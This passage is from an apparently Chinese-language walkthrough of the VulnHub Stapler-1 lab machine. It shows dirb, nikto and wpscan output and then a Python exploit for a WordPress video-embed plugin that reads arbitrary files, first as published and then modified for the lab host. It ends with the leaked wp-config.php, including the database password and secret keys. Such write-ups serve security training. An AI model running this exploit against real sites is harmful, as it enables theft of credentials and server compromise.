|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_
```

dirb扫一波12380端口的目录

``` bash
root@kali:~# dirb https://192.168.56.122:12380/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Apr 13 22:11:33 2020
URL_BASE: https://192.168.56.122:12380/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.56.122:12380/ ----
==> DIRECTORY: https://192.168.56.122:12380/announcements/                                                                
+ https://192.168.56.122:12380/index.html (CODE:200|SIZE:21)                                                              
==> DIRECTORY: https://192.168.56.122:12380/javascript/                                                                   
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/                                                                   
+ https://192.168.56.122:12380/robots.txt (CODE:200|SIZE:59)                                                              
+ https://192.168.56.122:12380/server-status (CODE:403|SIZE:305)                                                          
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/announcements/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/javascript/ ----
==> DIRECTORY: https://192.168.56.122:12380/javascript/jquery/                                                            
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/doc/                                                               
+ https://192.168.56.122:12380/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                               
+ https://192.168.56.122:12380/phpmyadmin/index.php (CODE:200|SIZE:10332)                                                 
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/                                                                
+ https://192.168.56.122:12380/phpmyadmin/libraries (CODE:403|SIZE:312)                                                   
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/                                                            
+ https://192.168.56.122:12380/phpmyadmin/phpinfo.php (CODE:200|SIZE:10334)                                               
+ https://192.168.56.122:12380/phpmyadmin/setup (CODE:401|SIZE:464)                                                       
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/sql/                                                               
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/                                                            
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/javascript/jquery/ ----
+ https://192.168.56.122:12380/javascript/jquery/jquery (CODE:200|SIZE:284394)                                            
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/doc/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/doc/html/                                                          
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/jquery/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/transformations/                                                
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/az/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/bg/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ca/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/cs/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/da/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/de/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/el/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/es/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/et/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/fi/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/fr/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/gl/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/hu/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ia/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/id/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/it/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ja/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ko/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/lt/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/nl/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pl/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pt/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pt_BR/                                                      
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ro/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ru/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/si/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sk/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sl/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sq/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sv/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/tr/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/uk/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/vi/                                                         
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/zh_CN/                                                      
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/zh_TW/                                                      
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/sql/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/components/                                              
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/database/                                                
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/error/                                                   
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/javascript/                                              
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/list/                                                    
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/navigation/                                              
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/                                                   
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/test/                                                    
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/                                                   
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/doc/html/ ----
+ https://192.168.56.122:12380/phpmyadmin/doc/html/index.html (CODE:200|SIZE:12811)                                       
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/jquery/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/transformations/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/az/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/bg/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ca/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/cs/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/da/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/de/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/el/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/es/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/et/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/fi/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/fr/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/gl/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/hu/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ia/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/id/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/it/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ja/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ko/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/lt/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/nl/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pl/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pt/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pt_BR/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ro/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ru/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/si/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sk/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sl/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sq/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sv/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/tr/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/uk/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/vi/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/zh_CN/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/zh_TW/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/components/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/database/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/error/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/javascript/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/list/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/navigation/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/chart/                                             
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/search/                                            
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/test/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/css/                                               
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/img/                                               
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/                                            
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/chart/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/search/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/css/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/img/ ----
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/images/                                     
                                                                                                                          
---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/images/ ----
                                                                               ges/zt                                     
-----------------
END_TIME: Mon Apr 13 22:15:55 2020
DOWNLOADED: 290556 - FOUND: 10
```

上nikto

``` bash
root@kali:~# nikto -host http://192.168.56.122:12380/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.122
+ Target Hostname:    192.168.56.122
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2020-04-13 21:55:57 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '192.168.56.122' does not match certificate's names: Red.Initech
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-04-13 21:58:35 (GMT-4) (158 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

wpscan扫一下https://192.168.56.122:12380/blogblog/

``` bash
root@kali:~# wpscan --disable-tls-checks --url https://192.168.56.122:12380/blogblog/ --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: https://192.168.56.122:12380/blogblog/ [192.168.56.122]
[+] Started: Mon Apr 13 22:26:43 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://192.168.56.122:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] https://192.168.56.122:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://192.168.56.122:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.56.122:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://192.168.56.122:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://192.168.56.122:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://192.168.56.122:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[+] WordPress theme in use: bhost
 | Location: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2019-12-08T00:00:00.000Z
 | Readme: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.4.4
 | Style URL: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Apr 13 22:26:48 2020
[+] Requests Done: 69
[+] Cached Requests: 6
[+] Data Sent: 17.953 KB
[+] Data Received: 294.119 KB
[+] Memory used: 109.172 MB
[+] Elapsed time: 00:00:05
```

``` bash
root@kali:~# wpscan --disable-tls-checks --url https://192.168.56.122:12380/blogblog/ --enumerate p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: https://192.168.56.122:12380/blogblog/ [192.168.56.122]
[+] Started: Mon Apr 13 22:31:13 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://192.168.56.122:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] https://192.168.56.122:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://192.168.56.122:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.56.122:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://192.168.56.122:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://192.168.56.122:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://192.168.56.122:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[+] WordPress theme in use: bhost
 | Location: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2019-12-08T00:00:00.000Z
 | Readme: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.4.4
 | Style URL: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Apr 13 22:31:17 2020
[+] Requests Done: 2
[+] Cached Requests: 32
[+] Data Sent: 616 B
[+] Data Received: 1.095 KB
[+] Memory used: 194.785 MB
[+] Elapsed time: 00:00:03
```

#### getshell

访问

``` bash
https://192.168.56.122:12380/blogblog/wp-content/plugins/
```

在eploitdb中搜索

``` bash
root@kali:~# searchsploit wordpress advanced video
---------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------- ----------------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                        | exploits/php/webapps/39646.py
---------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

查看exploit的内容

``` bash
root@kali:~/vulnhub/stapler-1# cat /usr/share/exploitdb/exploits/php/webapps/39646.py
#!/usr/bin/env python

# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Google Dork: N/A
# Date: 04/01/2016
# Exploit Author: evait security GmbH
# Vendor Homepage: arshmultani - http://dscom.it/
# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
# Version: 1.0
# Tested on: Linux Apache / Wordpress 4.2.2

#       Timeline
#       03/24/2016 - Bug discovered
#       03/24/2016 - Initial notification of vendor
#       04/01/2016 - No answer from vendor, public release of bug 


# Vulnerable Code (/inc/classes/class.avePost.php) Line 57:

#  function ave_publishPost(){
#    $title = $_REQUEST['title'];
#    $term = $_REQUEST['term'];
#    $thumb = $_REQUEST['thumb'];
# <snip>
# Line 78:
#    $image_data = file_get_contents($thumb);


# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)

import random
import urllib2
import re

url = "http://127.0.0.1/wordpress" # insert url to wordpress

randomID = long(random.random() * 100000000000000000L)

objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
content =  objHtml.readlines()
for line in content:
        numbers = re.findall(r'\d+',line)
        id = numbers[-1]
        id = int(id) / 10

objHtml = urllib2.urlopen(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
        if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
                urls=re.findall('"(https?://.*?)"', line)
                print urllib2.urlopen(urls[0]).read()
```

修改poc中的ip和文件夹保存后运行poc，下面是修改后的poc脚本内容

``` bash
import random
import urllib2
import re
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
url = "https://192.168.56.122:12380/blogblog" # insert url to wordpress

randomID = long(random.random() * 100000000000000000L)

objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
content =  objHtml.readlines()
for line in content:
	numbers = re.findall(r'\d+',line)
	id = numbers[-1]
	id = int(id) / 10

objHtml = urllib2.urlopen(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
	if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
		urls=re.findall('"(https?://.*?)"', line)
		print urllib2.urlopen(urls[0]).read()
```

运行poc后没有任何输出，但是在https://192.168.56.122:12380/blogblog/wp-content/uploads/目录下新增了一个957550172.jpeg文件，下载此文件并查看里面的内容

``` bash
root@kali:~/vulnhub/stapler-1# cat 957550172.jpeg 
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
